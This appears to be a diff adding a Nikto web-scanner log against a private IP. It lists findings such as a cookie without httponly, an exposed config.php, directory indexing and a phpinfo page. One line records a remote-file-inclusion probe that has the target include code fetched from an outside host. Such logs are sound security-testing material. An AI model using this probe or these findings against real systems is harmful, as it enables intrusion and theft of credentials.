@@ -1,0 +1,11 @@
+- Nikto v2.1.5/2.1.5
++ Target Host: 10.82.182.170
++ Target Port: 80
++ GET /: Cookie PHPSESSID created without the httponly flag
++ GET /: The anti-clickjacking X-Frame-Options header is not present.
++ DEBUG HASH(0x5fb52c55c628): DEBUG HTTP verb may show server debugging information. See http://msdn.microsoft.com/en-us/library/e8z01xdh%28VS.80%29.aspx for details.
++ GET /config.php: /config.php: PHP Config file may contain database IDs and passwords.
++ -3268: GET /includes/: /includes/: Directory indexing found.
++ -3092: GET /includes/: /includes/: This might be interesting...
++ -3233: GET /info.php: /info.php: PHP is installed, and a test script which runs phpinfo() was found. This gives a lot of system information.
++ -5292: GET /info.php?file=http://cirt.net/rfiinc.txt?: /info.php?file=http://cirt.net/rfiinc.txt?: RFI from RSnake's list (http://ha.ckers.org/weird/rfi-locations.dat) or from http://osvdb.org/
